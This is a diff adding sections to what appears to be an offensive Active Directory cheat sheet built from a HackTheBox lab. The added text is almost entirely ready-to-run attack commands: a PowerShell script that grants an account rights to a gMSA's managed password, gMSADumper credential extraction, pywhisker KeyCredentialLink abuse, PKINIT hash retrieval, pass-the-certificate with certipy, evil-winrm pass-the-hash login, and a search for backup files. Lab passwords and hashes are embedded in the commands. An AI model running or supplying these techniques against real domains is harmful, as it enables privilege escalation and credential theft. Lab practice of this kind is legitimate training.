@@ -939,3 +939,90 @@ KRB5CCNAME=user.ccache certipy req -username 'user@domain.com' \
     -k -no-pass -target dc.domain.com \
     -ca
 ```
+
+***
+
+## &#x20;<mark style="color:red;">**Grant access**</mark> <mark style="color:red;"></mark><mark style="color:red;">to retrieve the</mark> <mark style="color:red;"></mark><mark style="color:red;">**managed password**</mark>&#x20;
+
+{% code fullWidth="true" %}
+```powershell
+# Configuration des paramètres pour Haze-IT-Backup
+$gMSA = "Haze-IT-Backup"
+# Utiliser votre compte actuel comme principal à ajouter
+$PrincipalToAdd = "mark.adams"
+
+# Récupération des membres actuels autorisés à récupérer le mot de passe
+Write-Host "Current PrincipalsAllowedToRetrieveManagedPassword:"
+$originalPrincipalsAllowedToRetrieveManagedPassword = Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA | Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword
+$originalPrincipalsAllowedToRetrieveManagedPassword
+Write-Host "`n"
+
+# Ajout de votre compte comme membre autorisé
+Write-Host "New PrincipalsAllowedToRetrieveManagedPassword:"
+$newPrincipalsAllowedToRetrieveManagedPassword = @()
+$newPrincipalsAllowedToRetrieveManagedPassword += $originalPrincipalsAllowedToRetrieveManagedPassword
+$newPrincipalsAllowedToRetrieveManagedPassword += $PrincipalToAdd
+$newPrincipalsAllowedToRetrieveManagedPassword
+
+# Application de la modification
+Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $newPrincipalsAllowedToRetrieveManagedPassword $gMSA
+Write-Host "`n"
+
+# Vérification de la modification
+Write-Host "Validation of updated PrincipalsAllowedToRetrieveManagedPassword:"
+Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA
+Write-Host "`n"
+
+# Après avoir récupéré le mot de passe, vous pourriez vouloir exécuter cette partie
+# pour restaurer les paramètres originaux (mais pas avant d'utiliser le compte)
+<#
+Write-Host "Restoring original PrincipalsAllowedToRetrieveManagedPassword:"
+Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $originalPrincipalsAllowedToRetrieveManagedPassword $gMSA
+Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA
+#>
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Extract credentials after GMSA abuse</mark>
+
+```shellscript
+python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb'
+```
+
+***
+
+## <mark style="color:red;">KeyCredentialLink abuse</mark>
+
+{% code overflow="wrap" fullWidth="true" %}
+```
+python3 ./pywhisker/pywhisker.py -d "haze.htb" -u "User$" -H ":7..5279ebc" --target "edward.martin" --action "add" --filename test1
+
+python3 gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass dxQ9JVHZr4Ic5XQLMwUM  haze.htb/edward.martin edward.martin.ccache    
+
+python3 getnthash.py -key b6cffe7be143e596c0b7c96995d59c72cd6ac8b5796cfd4f957c81e46a990ec4 haze.htb/edward.martin     
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Pass-the-Certificate</mark>
+
+```
+certipy-ad cert -export -pfx hmR0aTCH.pfx -password 'QMxc1tEcjlXgVEdTIHQt' -out pwn.pfx
+faketime "$(ntpdate -q dc01.haze.htb | cut -d ' ' -f 1,2)"
+
+certipy-ad auth -pfx pwn.pfx -dc-ip 10.129.242.141 -username 'edward.martin' -domain 'haze.htb'
+
+evil-winrm -i dc01.haze.htb -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'
+
+```
+
+***
+
+## <mark style="color:red;">FILE DISCOVERY</mark>&#x20;
+
+```
+gci C:\ -Include *.zip, *.bak, *.7z -File -Recurse -ea SilentlyContinue
+```
